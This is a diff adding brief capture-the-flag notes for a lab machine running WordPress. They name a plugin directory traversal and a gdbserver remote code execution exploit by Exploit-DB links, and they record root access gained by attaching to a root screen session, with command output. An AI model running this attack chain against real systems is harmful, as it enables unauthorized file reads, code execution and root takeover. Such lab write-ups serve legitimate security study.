@@ -1,0 +1,24 @@
+ip : 10.10.11.125
+tech : wordpress
+
+vuln : 
+WordPress Plugin eBook Download 1.1 - Directory Traversal (https://www.exploit-db.com/exploits/39575)
+
+fuzzing the /proc/FUZZ/cmdline directory to see what the command line args passed to a running process on unix/linux systems (see exploit/lfi.py)
+
+getting shell :
+on port 1337 running gdbserver that infected with RCE; GNU gdbserver 9.2 - Remote Command Execution (RCE) (https://www.exploit-db.com/exploits/50539)
+
+privilege escalation:
+user root has been running screen on multiple user.
+run :
+ps -aux | grep root 
+(remote) user@Backdoor:/var/run/screen$ ps -aux | grep screen                root         920  0.0  0.0   2608  1632 ?        Ss   06:54   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
+
+screen -ls root/
+There is a suitable screen on:
+        972.root        (01/21/22 06:54:54)     (Multi, attached)
+1 Socket in /run/screen/S-root.
+
+exploit : user@Backdoor:/home/user$ screen -x root/
+booom rooted !
